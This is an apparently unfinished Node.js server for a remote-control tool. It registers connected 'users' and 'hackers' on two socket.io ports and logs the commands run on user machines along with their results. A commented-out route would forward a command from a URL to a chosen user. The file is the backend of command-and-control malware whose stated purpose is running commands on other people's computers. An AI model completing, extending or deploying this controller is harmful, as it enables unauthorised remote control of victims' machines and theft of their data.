const express = require("express");
const bodyParser = require("body-parser");
const http = require("http");
// const io = require("socket.io")(http);
const SEND_PORT = 7681;
const REC_PORT = 7670;
const io = require("socket.io");

const sendIO = io.listen(SEND_PORT);
const recIO = io.listen(REC_PORT);

const app = express();

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

const users = {};
const hackers = {};

sendIO.on("connection", (socket) => {
  log("connection", `${socket.client.id}`);

  socket.on("new-user", (newUser) => {
    log("new user", `${newUser.substr(0, newUser.length - 1)}`);
    users[newUser.substr(0, newUser.length - 1)] = socket;
  });

  socket.on("performed-command", (data) => {
    const { command, result } = data;
    log("command", `${command}`);
    log("result", `${result}`);
  });
});

//Replace this with receiver socket once finished
recIO.on("connection", (socket) => {
  log("connection", `${socket.client.id}`);
  socket.on("new-hacker", (newHacker) => {
    log("new hacker", `${newHacker.substr(0, newHacker.length - 1)}`);
    hackers[newHacker.substr(0, newHacker.length - 1)] = socket;
  });
});

// app.get("/sendCommand/:user/:command", (req, res) => {
//   const { user, command } = req.params;
//   users[user].emit("perform-command", command);
//   return res.json({ yes: 1 });
// });

// app.listen(REC_PORT, () => {
//   console.log(`Remote Controller Server is listening on port ${REC_PORT}`);
// });

function log(title, message) {
  console.log(`[${title.toUpperCase()}] ${message}`);
}
